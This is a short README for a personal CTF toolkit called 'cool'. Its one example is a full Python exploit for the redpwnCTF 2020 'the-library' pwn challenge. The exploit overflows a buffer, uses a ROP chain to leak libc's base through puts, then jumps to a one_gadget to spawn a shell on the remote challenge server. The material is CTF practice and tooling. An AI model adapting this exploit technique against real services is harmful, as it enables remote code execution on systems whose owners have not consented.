# cool - CTF toolkit for me
[![CI](https://github.com/d2verb/cool/workflows/CI/badge.svg)](https://github.com/d2verb/cool/actions)
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://github.com/d2verb/cool/blob/master/LICENSE)

## How to install
TODO

## Example
This is an example solver to solve the pwn challenge (the-library) in redpwnCTF 2020.

```python
from cool.pwn import elf, remote
from cool.util import p64, u64

e = elf("./tmp/the-library")
l = elf("./tmp/libc.so.6")
p = remote("2020.redpwnc.tf", 31350)

pop_rdi = 0x00400733
one_gadget_offset = 0x10A38C

pld = b"A" * 0x18
pld += p64(pop_rdi)
pld += p64(e.got["read"])
pld += p64(e.plt["puts"])
pld += p64(e.symbols["main"])

# libc base leak
p.sendafter(b"name?\n", pld)
p.recvuntil(b"Hello there: ")
libc_base = u64(p.recv()[29 : 29 + 6] + b"\x00\x00") - l.symbols["read"]
print(f"[*] libc base: 0x{libc_base:x}")

# execute main again & send one_gadget RCE address
one_gadget = one_gadget_offset + libc_base
pld = b"A" * 0x18
pld += p64(one_gadget)

p.sendline(pld)
p.interact()
```

## License
MIT License